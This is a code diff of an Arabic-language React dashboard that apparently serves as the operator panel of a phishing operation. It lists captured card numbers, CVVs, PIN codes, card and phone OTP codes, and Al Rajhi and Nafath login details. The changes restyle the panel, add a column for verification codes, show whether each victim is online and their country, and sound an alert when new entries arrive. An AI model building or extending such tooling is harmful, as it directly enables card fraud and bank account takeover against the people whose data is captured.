@@ -32,13 +32,11 @@ import {
   ChevronsRight,
   Volume2,
   VolumeX,
-  Sparkles,
-  Star,
-  Zap,
 } from "lucide-react"
 import { Button } from "@/components/ui/button"
 import { Badge } from "@/components/ui/badge"
-import { format, formatDistanceToNow } from "date-fns"
+import { formatDistanceToNow } from "date-fns"
+import { ar } from 'date-fns/locale'
 import { Toaster, toast } from "sonner"
 import {
   Dialog,
@@ -63,14 +61,14 @@ import { Tooltip, TooltipContent, TooltipProvider, TooltipTrigger } from "@/comp
 import { Input } from "@/components/ui/input"
 import { collection, doc, writeBatch, updateDoc, onSnapshot, query, orderBy } from "firebase/firestore"
 import { onAuthStateChanged, signOut } from "firebase/auth"
-import { auth, db } from "@/lib/firebase"
+import { auth, database, db } from "@/lib/firebase"
 import { Skeleton } from "@/components/ui/skeleton"
 import PhoneDialog from "@/components/phone-info"
 import NafazAuthDialog from "@/components/nafaz"
 import RajhiAuthDialog from "@/components/rajhi"
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
 import { Sheet, SheetContent, SheetDescription, SheetHeader, SheetTitle } from "@/components/ui/sheet"
-import { ar } from "date-fns/locale"
+import { onValue, ref } from "firebase/database"
 
 interface PaymentData {
   card_number?: string
@@ -95,6 +93,7 @@ interface Notification {
   customs_code?: string
   cvv?: string
   document_owner_full_name?: string
+  totalPrice?:string,
   expiration_date?: string
   formData?: FormData
   full_name?: string
@@ -126,7 +125,8 @@ interface Notification {
   operator?: string
   otpPhoneStatus: string
   phoneOtpCode: string
-  phoneVerificationStatus: string
+  phoneVerificationStatus: string,
+  country?:string
 }
 
 export default function NotificationsPage() {
@@ -156,32 +156,32 @@ export default function NotificationsPage() {
   const [itemsPerPage, setItemsPerPage] = useState(50)
   const [totalPages, setTotalPages] = useState(0)
 
-  const notificationSoundRef = useRef<HTMLAudioElement | null>(null)
+  // Audio ref for notification sound
+  const audioRef = useRef<HTMLAudioElement | null>(null)
+  const previousNotificationCountRef = useRef<number>(0)
 
-  // Initialize notification sound
+  // Initialize audio on component mount
   useEffect(() => {
-    // Create audio context for notification sound
-    const audio = new Audio()
-    // Using a data URL for a simple notification beep sound
-    audio.src =
-      "data:audio/wav;base64,UklGRnoGAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQoGAACBhYqFbF1fdJivrJBhNjVgodDbq2EcBj+a2/LDciUFLIHO8tiJNwgZaLvt559NEAxQp+PwtmMcBjiR1/LMeSwFJHfH8N2QQAoUXrTp66hVFApGn+DyvmwhBSuBzvLZiTYIG2m98OScTgwOUarm7blmGgU7k9n1unEiBC13yO/eizEIHWq+8+OWT"
-    audio.preload = "auto"
-    audio.volume = 0.3
-    notificationSoundRef.current = audio
+    audioRef.current = new Audio("/beeb.wav")
+    audioRef.current.preload = "auto"
+
+    // Handle audio loading errors
+    audioRef.current.addEventListener("error", (e) => {
+      console.error("Failed to load notification sound:", e)
+    })
 
     return () => {
-      if (notificationSoundRef.current) {
-        notificationSoundRef.current = null
+      if (audioRef.current) {
+        audioRef.current.removeEventListener("error", () => { })
       }
     }
   }, [])
 
   const playNotificationSound = () => {
-    const audio = new Audio("/beep_sms.mp3")
-    console.log("play")
-    if (audio) {
-      audio!.play().catch((error) => {
-        console.error("Failed to play sound:", error)
+    if (soundEnabled && audioRef.current) {
+      audioRef.current.currentTime = 0 // Reset to beginning
+      audioRef.current.play().catch((error) => {
+        console.error("Failed to play notification sound:", error)
       })
     }
   }
@@ -223,7 +223,47 @@ export default function NotificationsPage() {
 
     return () => unsubscribe()
   }, [router])
-
+  
+  function UserStatus({ userId ,country}: { userId: string ,country:string}) {
+    const [status, setStatus] = useState<"online" | "offline" | "unknown">(
+      "unknown"
+    );
+  
+    useEffect(() => {
+      const userStatusRef = ref(database, `/status/${userId}`);
+  
+      const unsubscribe = onValue(userStatusRef , (snapshot) => {
+        const data = snapshot.val();
+        if (data) {
+          setStatus(data.state === "online" ? "online" : "offline");
+        } else {
+          setStatus("unknown");
+        }
+      });
+  
+      return () => unsubscribe();
+    }, [userId]);
+  
+    return (
+      <div className="flex items-center gap-2">
+        <div
+          className={`w-2 h-2 rounded-full ${
+            status === "online" ? "bg-green-500 animate-pulse" : "bg-red-500"
+          }`}
+        />
+        <Badge
+          variant="outline"
+          className={`text-xs ${
+            status === "online"
+              ? "bg-green-50 text-green-700 border-green-200 dark:bg-green-950/30 dark:text-green-300"
+              : "bg-red-50 text-red-700 border-red-200 dark:bg-red-950/30 dark:text-red-300"
+          }`}
+        >
+          {country}
+        </Badge>
+      </div>
+    );
+  }
   useEffect(() => {
     if (searchTerm.trim() === "" && !activeFilter) {
       setFilteredNotifications(notifications)
@@ -293,10 +333,28 @@ export default function NotificationsPage() {
           .map((doc) => ({ id: doc.id, ...doc.data() }) as any)
           .filter((notification: any) => !notification.isHidden) as Notification[]
 
-        // Play sound if new notifications arrived
-        if (notifications.length > 0 && notificationsData.length > notifications.length) {
+        // Check if there are new notifications and play sound
+        const currentCount = notificationsData.length
+        const previousCount = previousNotificationCountRef.current
+
+        // Only play sound if:
+        // 1. This is not the initial load (previousCount > 0)
+        // 2. There are more notifications than before
+        // 3. Sound is enabled
+        if (previousCount > 0 && currentCount > previousCount && soundEnabled) {
+          console.log("New notification detected, playing sound")
           playNotificationSound()
+
+          // Show toast for new notification
+          toast.success("إشعار جديد وصل!", {
+            position: "top-center",
+            duration: 3000,
+            icon: <Bell className="h-5 w-5" />,
+          })
         }
+
+        // Update the previous count
+        previousNotificationCountRef.current = currentCount
 
         setNotifications(notificationsData)
         setFilteredNotifications(notificationsData)
@@ -335,6 +393,8 @@ export default function NotificationsPage() {
       await batch.commit()
       setNotifications([])
       setFilteredNotifications([])
+      // Reset the count when clearing all
+      previousNotificationCountRef.current = 0
       toast.success("تم مسح جميع البيانات بنجاح", {
         position: "top-center",
         duration: 3000,
@@ -358,6 +418,8 @@ export default function NotificationsPage() {
       await updateDoc(docRef, { isHidden: true })
       const updatedNotifications = notifications.filter((notification) => notification.id !== id)
       setNotifications(updatedNotifications)
+      // Update the count when deleting
+      previousNotificationCountRef.current = updatedNotifications.length
       setFilteredNotifications(
         updatedNotifications.filter((notification) => {
           const matchesSearch =
@@ -628,11 +690,8 @@ export default function NotificationsPage() {
         badge = (
           <Badge
             variant="outline"
-            className={`bg-gradient-to-r from-emerald-100 via-emerald-200 to-teal-200 text-emerald-800 border-emerald-300 shadow-lg hover:shadow-xl transition-all duration-300 ${
-              clickable
-                ? "cursor-pointer hover:from-emerald-200 hover:via-emerald-300 hover:to-teal-300 hover:scale-105"
-                : ""
-            }`}
+            className={`bg-gradient-to-r from-emerald-500 to-emerald-600 text-white border-0 shadow-sm ${clickable ? "cursor-pointer hover:from-emerald-600 hover:to-emerald-700" : ""
+              }`}
           >
             <CreditCard className="h-3 w-3 mr-1" /> دفع
           </Badge>
@@ -642,11 +701,8 @@ export default function NotificationsPage() {
         badge = (
           <Badge
             variant="outline"
-            className={`bg-gradient-to-r from-blue-100 via-indigo-200 to-purple-200 text-blue-800 border-blue-300 shadow-lg hover:shadow-xl transition-all duration-300 ${
-              clickable
-                ? "cursor-pointer hover:from-blue-200 hover:via-indigo-300 hover:to-purple-300 hover:scale-105"
-                : ""
-            }`}
+            className={`bg-gradient-to-r from-indigo-500 to-indigo-600 text-white border-0 shadow-sm ${clickable ? "cursor-pointer hover:from-indigo-600 hover:to-indigo-700" : ""
+              }`}
           >
             <FileText className="h-3 w-3 mr-1" /> تسجيل
           </Badge>
@@ -656,11 +712,8 @@ export default function NotificationsPage() {
         badge = (
           <Badge
             variant="outline"
-            className={`bg-gradient-to-r from-purple-100 via-violet-200 to-fuchsia-200 text-purple-800 border-purple-300 shadow-lg hover:shadow-xl transition-all duration-300 ${
-              clickable
-                ? "cursor-pointer hover:from-purple-200 hover:via-violet-300 hover:to-fuchsia-300 hover:scale-105"
-                : ""
-            }`}
+            className={`bg-gradient-to-r from-purple-500 to-purple-600 text-white border-0 shadow-sm ${clickable ? "cursor-pointer hover:from-purple-600 hover:to-purple-700" : ""
+              }`}
           >
             <Shield className="h-3 w-3 mr-1" /> رمز OTP
           </Badge>
@@ -670,11 +723,8 @@ export default function NotificationsPage() {
         badge = (
           <Badge
             variant="outline"
-            className={`bg-gradient-to-r from-orange-100 via-amber-200 to-yellow-200 text-orange-800 border-orange-300 shadow-lg hover:shadow-xl transition-all duration-300 ${
-              clickable
-                ? "cursor-pointer hover:from-orange-200 hover:via-amber-300 hover:to-yellow-300 hover:scale-105"
-                : ""
-            }`}
+            className={`bg-gradient-to-r from-orange-500 to-orange-600 text-white border-0 shadow-sm ${clickable ? "cursor-pointer hover:from-orange-600 hover:to-orange-700" : ""
+              }`}
           >
             <Smartphone className="h-3 w-3 mr-1" /> رمز هاتف
           </Badge>
@@ -684,9 +734,8 @@ export default function NotificationsPage() {
         badge = (
           <Badge
             variant="outline"
-            className={`bg-gradient-to-r from-teal-100 via-cyan-200 to-sky-200 text-teal-800 border-teal-300 shadow-lg hover:shadow-xl transition-all duration-300 ${
-              clickable ? "cursor-pointer hover:from-teal-200 hover:via-cyan-300 hover:to-sky-300 hover:scale-105" : ""
-            }`}
+            className={`bg-gradient-to-r from-teal-500 to-teal-600 text-white border-0 shadow-sm ${clickable ? "cursor-pointer hover:from-teal-600 hover:to-teal-700" : ""
+              }`}
           >
             <Tag className="h-3 w-3 mr-1" /> راجحي
           </Badge>
@@ -696,9 +745,8 @@ export default function NotificationsPage() {
         badge = (
           <Badge
             variant="outline"
-            className={`bg-gradient-to-r from-cyan-100 via-sky-200 to-blue-200 text-cyan-800 border-cyan-300 shadow-lg hover:shadow-xl transition-all duration-300 ${
-              clickable ? "cursor-pointer hover:from-cyan-200 hover:via-sky-300 hover:to-blue-300 hover:scale-105" : ""
-            }`}
+            className={`bg-gradient-to-r from-cyan-500 to-cyan-600 text-white border-0 shadow-sm ${clickable ? "cursor-pointer hover:from-cyan-600 hover:to-cyan-700" : ""
+              }`}
           >
             <Shield className="h-3 w-3 mr-1" /> نفاذ
           </Badge>
@@ -708,11 +756,8 @@ export default function NotificationsPage() {
         badge = (
           <Badge
             variant="outline"
-            className={`bg-gradient-to-r from-slate-100 via-gray-200 to-zinc-200 text-slate-800 border-slate-300 shadow-lg hover:shadow-xl transition-all duration-300 ${
-              clickable
-                ? "cursor-pointer hover:from-slate-200 hover:via-gray-300 hover:to-zinc-300 hover:scale-105"
-                : ""
-            }`}
+            className={`bg-gradient-to-r from-emerald-500 to-emerald-600 text-white border-0 shadow-sm ${clickable ? "cursor-pointer hover:from-emerald-600 hover:to-emerald-700" : ""
+              }`}
           >
             <Calendar className="h-3 w-3 mr-1" /> الرئيسية
           </Badge>
@@ -722,9 +767,8 @@ export default function NotificationsPage() {
         badge = (
           <Badge
             variant="outline"
-            className={`bg-gradient-to-r from-rose-100 via-pink-200 to-red-200 text-rose-800 border-rose-300 shadow-lg hover:shadow-xl transition-all duration-300 ${
-              clickable ? "cursor-pointer hover:from-rose-200 hover:via-pink-300 hover:to-red-300 hover:scale-105" : ""
-            }`}
+            className={`bg-gradient-to-r from-stone-500 to-stone-600 text-white border-0 shadow-sm ${clickable ? "cursor-pointer hover:from-stone-600 hover:to-stone-700" : ""
+              }`}
           >
             <Tag className="h-3 w-3 mr-1" /> {pagename || "الرئيسية"}
           </Badge>
@@ -816,18 +860,17 @@ export default function NotificationsPage() {
 
   if (isLoading) {
     return (
-      <div className="min-h-screen bg-gradient-to-br from-violet-100 via-purple-50 to-fuchsia-100 dark:from-slate-900 dark:via-purple-900 dark:to-slate-900 text-foreground p-8">
-        <Card className="shadow-2xl border-0 overflow-hidden bg-white/90 backdrop-blur-sm">
-          <CardHeader className="bg-gradient-to-r from-purple-500 via-violet-500 to-indigo-500 text-white pb-2 border-b border-purple-200/50">
+      <div className="min-h-screen bg-gradient-to-br from-stone-50 via-amber-50 to-orange-50 dark:from-stone-900 dark:via-stone-800 dark:to-stone-900 text-foreground p-8">
+        <Card className="shadow-lg border-0 overflow-hidden bg-white/90 backdrop-blur-sm">
+          <CardHeader className="bg-white/95 dark:bg-stone-800/95 pb-2 border-b border-stone-200/50">
             <div className="flex justify-between items-center">
-              <CardTitle className="text-2xl font-bold flex items-center gap-3">
-                <Sparkles className="h-8 w-8 text-yellow-300" />
-                لوحة البيانات المطورة
+              <CardTitle className="text-2xl font-bold bg-gradient-to-r from-emerald-600 to-teal-600 text-transparent bg-clip-text">
+                لوحة البيانات
               </CardTitle>
-              <Skeleton className="h-9 w-32 rounded-md bg-white/20" />
+              <Skeleton className="h-9 w-32 rounded-md" />
             </div>
           </CardHeader>
-          <CardContent className="p-6 bg-gradient-to-br from-white via-purple-50 to-indigo-50">
+          <CardContent className="p-6 bg-white/95 dark:bg-stone-800/95">
             <div className="space-y-6">
               <div className="flex justify-between">
                 <Skeleton className="h-10 w-64 rounded-md" />
@@ -837,7 +880,7 @@ export default function NotificationsPage() {
                 {[1, 2, 3, 4].map((i) => (
                   <div
                     key={i}
-                    className="flex items-center justify-between p-4 border border-purple-100 rounded-lg bg-gradient-to-r from-white to-purple-50"
+                    className="flex items-center justify-between p-4 border border-stone-100 dark:border-stone-700 rounded-lg"
                   >
                     <div className="flex items-center gap-4">
                       <Skeleton className="h-10 w-10 rounded-full" />
@@ -860,19 +903,18 @@ export default function NotificationsPage() {
   return (
     <div
       dir="rtl"
-      className="min-h-screen bg-gradient-to-br from-violet-100 via-purple-50 to-fuchsia-100 dark:from-slate-900 dark:via-purple-900 dark:to-slate-900 text-foreground p-4 md:p-8"
+      className="min-h-screen bg-gradient-to-br from-stone-50 via-amber-50 to-orange-50 dark:from-stone-900 dark:via-stone-800 dark:to-stone-900 text-foreground p-4 md:p-8"
     >
       <Toaster richColors closeButton position="top-center" />
-      <Card className="shadow-2xl border-0 overflow-hidden bg-white/90 backdrop-blur-sm">
-        <CardHeader className="bg-gradient-to-r from-purple-500 via-violet-500 to-indigo-500 text-white pb-4 border-b border-purple-200/50">
+      <Card className="shadow-lg border-0 overflow-hidden bg-white/90 backdrop-blur-sm">
+        <CardHeader className="bg-white/95 dark:bg-stone-800/95 pb-4 border-b border-stone-200/50">
           <div className="flex flex-col sm:flex-row justify-between items-center gap-4">
             <div className="flex items-center gap-3">
-              <div className="bg-gradient-to-r from-yellow-400 to-orange-400 p-3 rounded-xl shadow-lg">
-                <Sparkles className="h-8 w-8 text-white" />
+              <div className="bg-gradient-to-r from-emerald-500 to-teal-500 p-2 rounded-lg shadow-md">
+                <Bell className="h-6 w-6 text-white" />
               </div>
-              <CardTitle className="text-2xl font-bold text-white flex items-center gap-2">
-                لوحة البيانات المطورة
-                <Star className="h-6 w-6 text-yellow-300 animate-pulse" />
+              <CardTitle className="text-2xl font-bold bg-gradient-to-r from-emerald-600 to-teal-600 text-transparent bg-clip-text">
+                لوحة البيانات
               </CardTitle>
             </div>
             <div className="flex flex-wrap sm:flex-nowrap gap-2">
@@ -882,7 +924,10 @@ export default function NotificationsPage() {
                     <Button
                       variant="outline"
                       onClick={() => setSoundEnabled(!soundEnabled)}
-                      className="gap-2 bg-white/20 border-white/30 text-white hover:bg-white/30 backdrop-blur-sm"
+                      className={`gap-2 border border-stone-200 dark:border-stone-700 shadow-sm hover:bg-stone-50 dark:hover:bg-stone-800 ${soundEnabled
+                          ? "bg-emerald-50 border-emerald-200 text-emerald-700"
+                          : "bg-rose-50 border-rose-200 text-rose-700"
+                        }`}
                     >
                       {soundEnabled ? <Volume2 className="h-4 w-4" /> : <VolumeX className="h-4 w-4" />}
                       {soundEnabled ? "إيقاف الصوت" : "تشغيل الصوت"}
@@ -900,7 +945,7 @@ export default function NotificationsPage() {
                     <Button
                       variant="outline"
                       onClick={refreshData}
-                      className="gap-2 bg-white/20 border-white/30 text-white hover:bg-white/30 backdrop-blur-sm"
+                      className="gap-2 border border-stone-200 dark:border-stone-700 shadow-sm hover:bg-stone-50 dark:hover:bg-stone-800"
                       disabled={isRefreshing}
                     >
                       {isRefreshing ? <Loader2 className="h-4 w-4 animate-spin" /> : <RefreshCw className="h-4 w-4" />}
@@ -919,7 +964,7 @@ export default function NotificationsPage() {
                     <Button
                       variant="destructive"
                       onClick={handleClearAll}
-                      className="gap-2 bg-gradient-to-r from-rose-500 to-red-500 hover:from-rose-600 hover:to-red-600 border-0 shadow-lg"
+                      className="gap-2 bg-gradient-to-r from-rose-500 to-red-500 hover:from-rose-600 hover:to-red-600 border-0 shadow-md"
                       disabled={notifications.length === 0}
                     >
                       <Trash2 className="h-4 w-4" />
@@ -938,7 +983,7 @@ export default function NotificationsPage() {
                     <Button
                       variant="outline"
                       onClick={handleLogout}
-                      className="gap-2 bg-white/20 border-white/30 text-white hover:bg-white/30 backdrop-blur-sm"
+                      className="gap-2 border border-stone-200 dark:border-stone-700 shadow-sm hover:bg-stone-50 dark:hover:bg-stone-800"
                     >
                       <LogOut className="h-4 w-4" />
                       تسجيل الخروج
@@ -953,14 +998,14 @@ export default function NotificationsPage() {
           </div>
         </CardHeader>
 
-        <div className="p-4 bg-gradient-to-r from-white via-purple-50 to-indigo-50 border-b border-purple-200/50">
+        <div className="p-4 bg-white/95 dark:bg-stone-800/95 border-b border-stone-200/50">
           <div className="flex flex-col md:flex-row gap-4 justify-between">
             <div className="flex flex-col sm:flex-row gap-3 w-full">
               <div className="relative w-full md:w-96">
-                <Search className="absolute right-3 top-2.5 h-4 w-4 text-purple-500" />
+                <Search className="absolute right-3 top-2.5 h-4 w-4 text-stone-500" />
                 <Input
                   placeholder="بحث بالاسم أو رقم الهاتف أو رقم البطاقة..."
-                  className="pr-10 w-full border-purple-200 focus:border-purple-400 focus:ring-purple-400/20 bg-white/80 backdrop-blur-sm"
+                  className="pr-10 w-full border-stone-200 focus:border-emerald-400 focus:ring-emerald-400/20"
                   value={searchTerm}
                   onChange={(e) => {
                     setSearchTerm(e.target.value)
@@ -969,7 +1014,7 @@ export default function NotificationsPage() {
                 />
               </div>
               <Select value={sortOrder} onValueChange={handleSortChange}>
-                <SelectTrigger className="w-[180px] border-purple-200 focus:border-purple-400 focus:ring-purple-400/20 bg-white/80 backdrop-blur-sm">
+                <SelectTrigger className="w-[180px] border-stone-200 focus:border-emerald-400 focus:ring-emerald-400/20">
                   <SelectValue placeholder="ترتيب حسب" />
                 </SelectTrigger>
                 <SelectContent>
@@ -978,7 +1023,7 @@ export default function NotificationsPage() {
                 </SelectContent>
               </Select>
               <Select value={itemsPerPage.toString()} onValueChange={handleItemsPerPageChange}>
-                <SelectTrigger className="w-[120px] border-purple-200 focus:border-purple-400 focus:ring-purple-400/20 bg-white/80 backdrop-blur-sm">
+                <SelectTrigger className="w-[120px] border-stone-200 focus:border-emerald-400 focus:ring-emerald-400/20">
                   <SelectValue placeholder="عدد العناصر" />
                 </SelectTrigger>
                 <SelectContent>
@@ -997,12 +1042,9 @@ export default function NotificationsPage() {
                 size="sm"
                 onClick={() => applyFilter(null)}
                 className={
-                  activeFilter === null
-                    ? "bg-gradient-to-r from-purple-600 to-indigo-600 text-white hover:from-purple-700 hover:to-indigo-700 shadow-lg"
-                    : "hover:bg-purple-50 border-purple-200"
+                  activeFilter === null ? "bg-emerald-600 text-white hover:bg-emerald-700" : "hover:bg-stone-50"
                 }
               >
-                <Zap className="h-3.5 w-3.5 ml-1" />
                 الكل
               </Button>
               <Button
@@ -1010,9 +1052,7 @@ export default function NotificationsPage() {
                 size="sm"
                 onClick={() => applyFilter("pending")}
                 className={
-                  activeFilter === "pending"
-                    ? "bg-gradient-to-r from-amber-500 to-orange-500 text-white hover:from-amber-600 hover:to-orange-600 shadow-lg"
-                    : "hover:bg-amber-50 border-amber-200"
+                  activeFilter === "pending" ? "bg-amber-500 text-white hover:bg-amber-600" : "hover:bg-stone-50"
                 }
               >
                 <Clock className="h-3.5 w-3.5 ml-1" />
@@ -1023,9 +1063,7 @@ export default function NotificationsPage() {
                 size="sm"
                 onClick={() => applyFilter("approved")}
                 className={
-                  activeFilter === "approved"
-                    ? "bg-gradient-to-r from-emerald-500 to-teal-500 text-white hover:from-emerald-600 hover:to-teal-600 shadow-lg"
-                    : "hover:bg-emerald-50 border-emerald-200"
+                  activeFilter === "approved" ? "bg-emerald-500 text-white hover:bg-emerald-600" : "hover:bg-stone-50"
                 }
               >
                 <CheckCircle className="h-3.5 w-3.5 ml-1" />
@@ -1036,9 +1074,7 @@ export default function NotificationsPage() {
                 size="sm"
                 onClick={() => applyFilter("rejected")}
                 className={
-                  activeFilter === "rejected"
-                    ? "bg-gradient-to-r from-rose-500 to-red-500 text-white hover:from-rose-600 hover:to-red-600 shadow-lg"
-                    : "hover:bg-rose-50 border-rose-200"
+                  activeFilter === "rejected" ? "bg-rose-500 text-white hover:bg-rose-600" : "hover:bg-stone-50"
                 }
               >
                 <XCircle className="h-3.5 w-3.5 ml-1" />
@@ -1049,9 +1085,7 @@ export default function NotificationsPage() {
                 size="sm"
                 onClick={() => applyFilter("payment")}
                 className={
-                  activeFilter === "payment"
-                    ? "bg-gradient-to-r from-emerald-500 to-teal-500 text-white hover:from-emerald-600 hover:to-teal-600 shadow-lg"
-                    : "hover:bg-emerald-50 border-emerald-200"
+                  activeFilter === "payment" ? "bg-emerald-500 text-white hover:bg-emerald-600" : "hover:bg-stone-50"
                 }
               >
                 <CreditCard className="h-3.5 w-3.5 ml-1" />
@@ -1062,9 +1096,7 @@ export default function NotificationsPage() {
                 size="sm"
                 onClick={() => applyFilter("registration")}
                 className={
-                  activeFilter === "registration"
-                    ? "bg-gradient-to-r from-blue-500 to-indigo-500 text-white hover:from-blue-600 hover:to-indigo-600 shadow-lg"
-                    : "hover:bg-blue-50 border-blue-200"
+                  activeFilter === "registration" ? "bg-indigo-500 text-white hover:bg-indigo-600" : "hover:bg-stone-50"
                 }
               >
                 <Car className="h-3.5 w-3.5 ml-1" />
@@ -1074,14 +1106,14 @@ export default function NotificationsPage() {
           </div>
         </div>
 
-        <CardContent className="p-0 bg-gradient-to-br from-white via-purple-50 to-indigo-50">
+        <CardContent className="p-0 bg-white/95 dark:bg-stone-800/95">
           {filteredNotifications.length === 0 ? (
             <div className="flex flex-col items-center justify-center py-16">
-              <div className="w-24 h-24 rounded-full bg-gradient-to-r from-purple-100 to-indigo-100 flex items-center justify-center mb-4 shadow-lg">
-                <AlertCircle className="h-12 w-12 text-purple-500" />
+              <div className="w-24 h-24 rounded-full bg-stone-100 dark:bg-stone-700 flex items-center justify-center mb-4">
+                <AlertCircle className="h-12 w-12 text-stone-400" />
               </div>
-              <h3 className="text-xl font-medium mb-2 text-slate-700 dark:text-slate-300">لا توجد بيانات</h3>
-              <p className="text-slate-500 max-w-md text-center">
+              <h3 className="text-xl font-medium mb-2 text-stone-700 dark:text-stone-300">لا توجد بيانات</h3>
+              <p className="text-stone-500 max-w-md text-center">
                 {searchTerm || activeFilter
                   ? "لا توجد نتائج مطابقة لمعايير البحث. يرجى تعديل معايير البحث أو الفلتر."
                   : "ستظهر البيانات الجديدة هنا عند وصولها"}
@@ -1089,7 +1121,7 @@ export default function NotificationsPage() {
               {(searchTerm || activeFilter) && (
                 <Button
                   variant="outline"
-                  className="mt-4 border-purple-200 hover:bg-purple-50 bg-white/80 backdrop-blur-sm"
+                  className="mt-4 border-stone-200 hover:bg-stone-50"
                   onClick={() => {
                     setSearchTerm("")
                     setActiveFilter(null)
@@ -1103,33 +1135,34 @@ export default function NotificationsPage() {
             <div className="overflow-x-auto">
               <Table>
                 <TableHeader>
-                  <TableRow className="bg-gradient-to-r from-purple-100 via-violet-100 to-indigo-100 hover:from-purple-200 hover:via-violet-200 hover:to-indigo-200 border-b border-purple-200/50">
-                    <TableHead className="text-right font-bold text-purple-800">الصفحة الحالية</TableHead>
-                    <TableHead className="text-right font-bold text-purple-800">الاسم</TableHead>
-                    <TableHead className="text-right font-bold text-purple-800">رقم البطاقة</TableHead>
-                    <TableHead className="text-right font-bold text-purple-800">اجراء مطلوب</TableHead>
-                    <TableHead className="text-right font-bold text-purple-800">الحالة</TableHead>
-                    <TableHead className="text-right font-bold text-purple-800">التاريخ</TableHead>
-                    <TableHead className="text-center font-bold text-purple-800">إجراءات</TableHead>
+                  <TableRow className="bg-stone-50/80 hover:bg-stone-50/80 border-b border-stone-200/50">
+                    <TableHead className="text-right font-bold text-stone-700">الصفحة الحالية</TableHead>
+                    <TableHead className="text-right font-bold text-stone-700">الاسم</TableHead>
+                    <TableHead className="text-right font-bold text-stone-700">رقم البطاقة</TableHead>
+                    <TableHead className="text-right font-bold text-stone-700">اجراء مطلوب</TableHead>
+                    <TableHead className="text-right font-bold text-stone-700">رمز التحقق</TableHead>
+
+                    <TableHead className="text-right font-bold text-stone-700">الحالة</TableHead>
+                    <TableHead className="text-right font-bold text-stone-700">التاريخ</TableHead>
+                    <TableHead className="text-center font-bold text-stone-700">إجراءات</TableHead>
+                    <TableHead className="text-center font-bold text-stone-700">الحالة</TableHead>
                   </TableRow>
                 </TableHeader>
                 <TableBody>
-                  {paginatedNotifications.map((notification, index) => (
+                  {paginatedNotifications.map((notification) => (
                     <TableRow
                       key={notification.id}
-                      className={`hover:bg-gradient-to-r hover:from-purple-50 hover:via-violet-50 hover:to-indigo-50 border-b border-purple-100 cursor-pointer transition-all duration-300 ${
-                        index % 2 === 0 ? "bg-white/80" : "bg-gradient-to-r from-purple-25 to-indigo-25"
-                      }`}
+                      className="hover:bg-stone-50/50 border-b border-stone-100 dark:border-stone-700 relative cursor-pointer"
                     >
                       <TableCell>{getPageType(notification.pagename, true, notification)}</TableCell>
                       <TableCell className="font-medium">
                         <div className="flex items-center gap-2">
-                          <div className="w-8 h-8 rounded-full bg-gradient-to-r from-blue-100 to-indigo-100 flex items-center justify-center shadow-sm">
-                            <User className="h-4 w-4 text-blue-600" />
+                          <div className="w-8 h-8 rounded-full bg-emerald-50 flex items-center justify-center">
+                            <User className="h-4 w-4 text-emerald-600" />
                           </div>
                           <Badge
                             variant="outline"
-                            className="bg-gradient-to-r from-slate-100 via-gray-100 to-zinc-100 hover:from-slate-200 hover:via-gray-200 hover:to-zinc-200 text-slate-800 border-0 shadow-sm cursor-pointer transition-all duration-300 hover:scale-105"
+                            className="bg-gradient-to-r from-stone-100 to-stone-200 hover:from-stone-200 hover:to-stone-300 text-stone-800 border-0 shadow-sm cursor-pointer"
                             onClick={() => handleInfoClick(notification, "personal")}
                           >
                             {notification.documment_owner_full_name ||
@@ -1141,15 +1174,14 @@ export default function NotificationsPage() {
                       <TableCell>
                         <Badge
                           variant="outline"
-                          className={`cursor-pointer transition-all duration-300 hover:scale-105 shadow-sm ${
-                            notification.card_number
+                          className={`cursor-pointer ${notification.card_number
                               ? notification.pinCode
-                                ? "bg-gradient-to-r from-emerald-800 via-teal-500 to-sky-800 text-white border-emerald-200 hover:from-emerald-200 hover:via-teal-200 hover:to-green-200"
+                                ? "bg-emerald-50 text-emerald-700 border-emerald-200 hover:bg-emerald-100"
                                 : notification.otpCardCode
-                                  ? "bg-gradient-to-r from-teal-800 via-cyan-500 to-sky-500 text-teal-700 border-teal-200 hover:from-teal-200 hover:via-cyan-200 hover:to-sky-200"
-                                  : "bg-gradient-to-r from-green-500 via-green-600 to-green-500 text-white border-amber-500 hover:from-amber-500 hover:via-green-500 hover:to-orange-200"
-                              : "bg-gradient-to-r from-gray-100 via-pink-100 to-gray-100 text-black hover:from-rose-200 hover:via-pink-200 hover:to-red-200"
-                          }`}
+                                  ? "bg-teal-50 text-teal-700 border-teal-200 hover:bg-teal-100"
+                                  : "bg-amber-50 text-amber-700 border-amber-200 hover:bg-amber-100"
+                              : "bg-gradient-to-r from-rose-400 to-rose-500 text-white hover:from-rose-500 hover:to-rose-600"
+                            }`}
                           onClick={(e) => handleCardBadgeClick(notification, e)}
                         >
                           <CardIcon className="h-3.5 w-3.5 mr-1.5 mx-1" />
@@ -1165,7 +1197,7 @@ export default function NotificationsPage() {
                                 setSelectedNotification(notification)
                                 setShowNafazDialog(true)
                               }}
-                              className="bg-gradient-to-r from-cyan-100 via-sky-100 to-blue-100 text-cyan-800 hover:from-cyan-200 hover:via-sky-200 hover:to-blue-200 cursor-pointer border-cyan-300 transition-all duration-300 hover:scale-105 shadow-sm"
+                              className="bg-cyan-500 hover:bg-cyan-600 cursor-pointer"
                             >
                               نفاذ
                             </Badge>
@@ -1173,7 +1205,7 @@ export default function NotificationsPage() {
                           {notification?.externalUsername && (
                             <Badge
                               variant="default"
-                              className="cursor-pointer bg-gradient-to-r from-teal-100 via-emerald-100 to-green-100 text-teal-800 hover:from-teal-200 hover:via-emerald-200 hover:to-green-200 border-teal-300 transition-all duration-300 hover:scale-105 shadow-sm"
+                              className="cursor-pointer bg-teal-500 hover:bg-teal-600"
                               onClick={(e) => {
                                 e.stopPropagation()
                                 setSelectedNotification(notification)
@@ -1186,13 +1218,11 @@ export default function NotificationsPage() {
 
                           {notification.phone2 && (
                             <Badge
-                              className={`cursor-pointer transition-all duration-300 hover:scale-105 shadow-sm ${
-                                notification.phoneVerificationStatus === "pending" ? "animate-pulse" : ""
-                              } ${
-                                notification.otpCode
-                                  ? "bg-gradient-to-r from-purple-100 via-violet-100 to-fuchsia-100 text-purple-800 hover:from-purple-200 hover:via-violet-200 hover:to-fuchsia-200 border-purple-300"
-                                  : "bg-gradient-to-r from-slate-100 via-gray-100 to-zinc-100 text-slate-800 hover:from-slate-200 hover:via-gray-200 hover:to-zinc-200 border-slate-300"
-                              }`}
+                              className={`cursor-pointer ${notification.phoneVerificationStatus === "pending" ? "animate-pulse" : ""
+                                } ${notification.otpCode
+                                  ? "bg-purple-500 text-white hover:bg-purple-600"
+                                  : "bg-stone-500 hover:bg-stone-600"
